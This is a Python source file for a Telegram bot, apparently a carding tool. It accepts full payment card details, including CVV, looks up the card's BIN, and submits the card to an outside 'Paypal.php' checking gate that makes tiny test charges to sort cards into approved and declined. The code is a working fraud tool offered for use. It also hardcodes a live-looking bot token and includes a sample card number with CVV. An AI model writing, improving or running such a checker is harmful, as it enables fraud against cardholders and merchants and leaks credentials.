import requests
import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
)
from telegram.error import TelegramError

# Replace this with your NEW safe token
BOT_TOKEN = "7590360428:AAEwV6p3e0i0MB0ao5g1lxH3sct263_iDMM"

# Animation frames
ANIMATION_FRAMES = ["⏳ Checking... █", "⏳ Checking... ███", "⏳ Checking... █████", "⏳ Checking... ███████"]
ANIMATION_DELAY = 0.5  # seconds


def validate_card(card: str) -> bool:
    pattern = r'^\d{12,19}\|\d{2}\|\d{4}\|\d{3,4}$'
    return bool(re.match(pattern, card))


def get_bin_info(bin_code: str) -> dict:
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "issuer": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown") + " " + data.get("country_flag", "")
            }
    except Exception:
        pass
    return {"type": "Unknown", "brand": "Unknown", "issuer": "Unknown", "country": "Unknown"}


def check_card(card: str) -> tuple:
    try:
        payload = {"lista": card}
        response = requests.post("https://wizvenex.com/Paypal.php", data=payload, timeout=60)
        text = response.text.encode('utf-8', errors='replace').decode('utf-8')

        try:
            result = text.split('>')[1].split('<')[0].strip()
        except IndexError:
            result = text.strip()

        status = "Approved" if "approved" in result.lower() else "Declined"
        return True, status, result

    except Exception:
        return False, "Declined", "API Error: Something went wrong while checking the card."


def format_response(card: str, status: str, response: str, bin_info: dict) -> str:
    status_line = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "Approved" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    return (
        f"{status_line}\n\n"
        f"𝗖𝗮𝗿𝗱: `{card}`\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Paypal 0.01\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝗲: `{response}`\n\n"
        f"𝗜𝗻𝗳𝗼: {bin_info['type']} - {bin_info['brand']}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['issuer']}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}"
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to the Card Checker Bot!\n"
        "Use /pp <card_number|MM|YYYY|CVV> to check a card.\n"
        "Example: /pp 4517699015851741|09|2025|491"
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "ℹ️ Commands:\n"
        "/start - Show welcome message\n"
        "/pp <card> - Check card format: 1234|MM|YYYY|CVV\n"
        "/help - Show help message"
    )


async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    chat_id = update.effective_chat.id

    if not context.args:
        await message.reply_text("⚠️ Please provide card details like this:\n/pp 1234567890123456|09|2025|123")
        return

    card = " ".join(context.args).strip()
    if not validate_card(card):
        await message.reply_text("❌ Invalid card format.\nUse: number|MM|YYYY|CVV")
        return

    # Show loading animation
    loading = await message.reply_text(ANIMATION_FRAMES[0])
    msg_id = loading.message_id

    for frame in ANIMATION_FRAMES[1:]:
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=frame)
            await asyncio.sleep(ANIMATION_DELAY)
        except TelegramError:
            break

    bin_code = card.split('|')[0][:6]
    bin_info = get_bin_info(bin_code)
    success, status, response = check_card(card)
    final_text = format_response(card, status, response, bin_info)

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=final_text,
            parse_mode=ParseMode.MARKDOWN
        )
    except TelegramError:
        await message.reply_text(final_text, parse_mode=ParseMode.MARKDOWN)


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("pp", pp_command))
    print("✅ Bot is running...")
    app.run_polling()
